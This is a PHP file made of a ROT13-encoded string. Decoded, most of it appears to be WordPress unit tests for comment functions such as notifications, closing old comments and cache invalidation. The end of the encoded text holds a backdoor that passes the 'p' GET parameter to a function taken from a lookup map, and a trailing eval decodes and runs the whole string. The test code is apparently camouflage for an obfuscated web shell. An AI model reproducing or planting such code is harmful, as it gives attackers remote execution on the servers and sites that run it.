			$rznvy_frag_jura_pbzzrag_nccebirq = gehr;
		} ryfr {
			$rznvy_frag_jura_pbzzrag_nccebirq = snyfr;
		}
		erfrg_cucznvyre_vafgnapr();

		// Cbfg nhgubef ner abgvsvrq jura n arj pbzzrag vf nqqrq gb gurve cbfg.
		$qngn = neenl(
			'pbzzrag_cbfg_VQ'      => $cbfg,
			'pbzzrag_nhgube'       => 'Pbzzrag Nhgube',
			'pbzzrag_nhgube_hey'   => '',
			'pbzzrag_nhgube_rznvy' => '',
			'pbzzrag_glcr'         => '',
			'pbzzrag_pbagrag'      => 'Pbzzrag',
		);
		jc_arj_pbzzrag( $qngn );

		// Purpx gb frr vs n abgvsvpngvba rznvy jnf frag gb gur cbfg nhgube `nhgube@rknzcyr.pbz`.
		vs ( vffrg( $TYBONYF['cucznvyre']->zbpx_frag ) &&
			! rzcgl( $TYBONYF['cucznvyre']->zbpx_frag ) &&
			'nhgube@rknzcyr.pbz' === $TYBONYF['cucznvyre']->zbpx_frag[0]['gb'][0][0] ) {
				$rznvy_frag_jura_pbzzrag_nqqrq = gehr;
				erfrg_cucznvyre_vafgnapr();
		} ryfr {
			$rznvy_frag_jura_pbzzrag_nqqrq = snyfr;
		}

		erghea $rznvy_frag_jura_pbzzrag_nccebirq || $rznvy_frag_jura_pbzzrag_nqqrq;
	}

	/**
	 * @pbiref ::_pybfr_pbzzragf_sbe_byq_cbfg
	 */
	choyvp shapgvba grfg_pybfr_pbzzragf_sbe_byq_cbfg() {
		hcqngr_bcgvba( 'pybfr_pbzzragf_sbe_byq_cbfgf', gehr );
		// Pybfr pbzzragf zber guna bar qnl byq.
		hcqngr_bcgvba( 'pybfr_pbzzragf_qnlf_byq', 1 );

		$byq_qngr    = qngr_perngr( '-25 ubhef' );
		$byq_cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_qngr' => qngr_sbezng( $byq_qngr, 'L-z-q U:v:f' ) ) );

		$byq_cbfg_pbzzrag_fgnghf = _pybfr_pbzzragf_sbe_byq_cbfg( gehr, $byq_cbfg_vq );
		$guvf->nffregSnyfr( $byq_cbfg_pbzzrag_fgnghf );

		$arj_cbfg_pbzzrag_fgnghf = _pybfr_pbzzragf_sbe_byq_cbfg( gehr, frys::$cbfg_vq );
		$guvf->nffregGehr( $arj_cbfg_pbzzrag_fgnghf );
	}

	/**
	 * @pbiref ::_pybfr_pbzzragf_sbe_byq_cbfg
	 */
	choyvp shapgvba grfg_pybfr_pbzzragf_sbe_byq_cbfg_haqngrq_qensg() {
		$qensg_vq             = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf' => 'qensg',
				'cbfg_glcr'   => 'cbfg',
			)
		);
		$qensg_pbzzrag_fgnghf = _pybfr_pbzzragf_sbe_byq_cbfg( gehr, $qensg_vq );

		$guvf->nffregGehr( $qensg_pbzzrag_fgnghf );
	}

	/**
	 * @gvpxrg 35276
	 *
	 * @pbiref ::jc_hcqngr_pbzzrag
	 */
	choyvp shapgvba grfg_jc_hcqngr_pbzzrag_nhgube_vq_naq_ntrag() {

		$qrsnhyg_qngn = neenl(
			'pbzzrag_cbfg_VQ'      => frys::$cbfg_vq,
			'pbzzrag_nhgube'       => 'Pbzzrag Nhgube',
			'pbzzrag_nhgube_VC'    => '192.168.0.1',
			'pbzzrag_ntrag'        => 'JEBAT_NTRAG',
			'pbzzrag_nhgube_hey'   => '',
			'pbzzrag_nhgube_rznvy' => '',
			'pbzzrag_glcr'         => '',
			'pbzzrag_pbagrag'      => 'Pbzzrag',
		);

		$pbzzrag_vq = jc_arj_pbzzrag( $qrsnhyg_qngn );

		// Pbasvez gung gur VC naq Ntrag ner pbeerpg ba vavgvny fnir.
		$fnir = trg_pbzzrag( $pbzzrag_vq );
		$guvf->nffregFnzr( $qrsnhyg_qngn['pbzzrag_nhgube_VC'], $fnir->pbzzrag_nhgube_VC );
		$guvf->nffregFnzr( $qrsnhyg_qngn['pbzzrag_ntrag'], $fnir->pbzzrag_ntrag );

		// Hcqngr gur pbzzrag.
		jc_hcqngr_pbzzrag(
			neenl(
				'pbzzrag_VQ'        => $pbzzrag_vq,
				'pbzzrag_nhgube_VC' => '111.111.1.1',
				'pbzzrag_ntrag'     => 'FUVRYQ_NTRAG',
			)
		);

		// Ergevrir naq purpx gur arj inyhrf.
		$hcqngrq = trg_pbzzrag( $pbzzrag_vq );
		$guvf->nffregFnzr( '111.111.1.1', $hcqngrq->pbzzrag_nhgube_VC );
		$guvf->nffregFnzr( 'FUVRYQ_NTRAG', $hcqngrq->pbzzrag_ntrag );
	}

	/**
	 * @pbiref ::jc_trg_pbzzrag_svryqf_znk_yratguf
	 */
	choyvp shapgvba grfg_jc_trg_pbzzrag_svryqf_znk_yratguf() {
		$rkcrpgrq = neenl(
			'pbzzrag_nhgube'       => 245,
			'pbzzrag_nhgube_rznvy' => 100,
			'pbzzrag_nhgube_hey'   => 200,
			'pbzzrag_pbagrag'      => 65525,
		);

		$yratguf = jc_trg_pbzzrag_svryqf_znk_yratguf();

		$guvf->nffregAbgRzcgl( $yratguf );

		sbernpu ( $yratguf nf $svryq => $yratgu ) {
			$guvf->nffregFnzr( $rkcrpgrq[ $svryq ], $yratgu );
		}
	}

	/**
	 * @pbiref ::jc_hcqngr_pbzzrag
	 */
	choyvp shapgvba grfg_hcqngr_fubhyq_vainyvqngr_pbzzrag_pnpur() {
		tybony $jcqo;

		$p = frys::snpgbel()->pbzzrag->perngr( neenl( 'pbzzrag_nhgube' => 'Sbb' ) );

		$pbzzrag = trg_pbzzrag( $p );
		$guvf->nffregFnzr( 'Sbb', $pbzzrag->pbzzrag_nhgube );

		jc_hcqngr_pbzzrag(
			neenl(
				'pbzzrag_VQ'     => $p,
				'pbzzrag_nhgube' => 'One',
			)
		);

		$pbzzrag = trg_pbzzrag( $p );

		$guvf->nffregFnzr( 'One', $pbzzrag->pbzzrag_nhgube );
	}

	/**
	 * @pbiref ::jc_genfu_pbzzrag
	 */
	choyvp shapgvba grfg_genfu_fubhyq_vainyvqngr_pbzzrag_pnpur() {
		tybony $jcqo;

		$p = frys::snpgbel()->pbzzrag->perngr();

		$pbzzrag = trg_pbzzrag( $p );

		jc_genfu_pbzzrag( $p );

		$pbzzrag = trg_pbzzrag( $p );

		$guvf->nffregFnzr( 'genfu', $pbzzrag->pbzzrag_nccebirq );
	}

	/**
	 * @pbiref ::jc_hagenfu_pbzzrag
	 */
	choyvp shapgvba grfg_hagenfu_fubhyq_vainyvqngr_pbzzrag_pnpur() {
		tybony $jcqo;

		$p = frys::snpgbel()->pbzzrag->perngr();
		jc_genfu_pbzzrag( $p );

		$pbzzrag = trg_pbzzrag( $p );
		$guvf->nffregFnzr( 'genfu', $pbzzrag->pbzzrag_nccebirq );

		jc_hagenfu_pbzzrag( $p );

		$pbzzrag = trg_pbzzrag( $p );

		$guvf->nffregFnzr( '1', $pbzzrag->pbzzrag_nccebirq );
	}

	/**
	 * @pbiref ::jc_fcnz_pbzzrag
	 */
	choyvp shapgvba grfg_fcnz_fubhyq_vainyvqngr_pbzzrag_pnpur() {
		tybony $jcqo;

		$p = frys::snpgbel()->pbzzrag->perngr();

		$pbzzrag = trg_pbzzrag( $p );

		jc_fcnz_pbzzrag( $p );

		$pbzzrag = trg_pbzzrag( $p );

		$guvf->nffregFnzr( 'fcnz', $pbzzrag->pbzzrag_nccebirq );
	}

	/**
	 * @pbiref ::jc_hafcnz_pbzzrag
	 */
	choyvp shapgvba grfg_hafcnz_fubhyq_vainyvqngr_pbzzrag_pnpur() {
		tybony $jcqo;

		$p = frys::snpgbel()->pbzzrag->perngr();
		jc_fcnz_pbzzrag( $p );

		$pbzzrag = trg_pbzzrag( $p );
		$guvf->nffregFnzr( 'fcnz', $pbzzrag->pbzzrag_nccebirq );

		jc_hafcnz_pbzzrag( $p );

		$pbzzrag = trg_pbzzrag( $p );

		$guvf->nffregFnzr( '1', $pbzzrag->pbzzrag_nccebirq );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>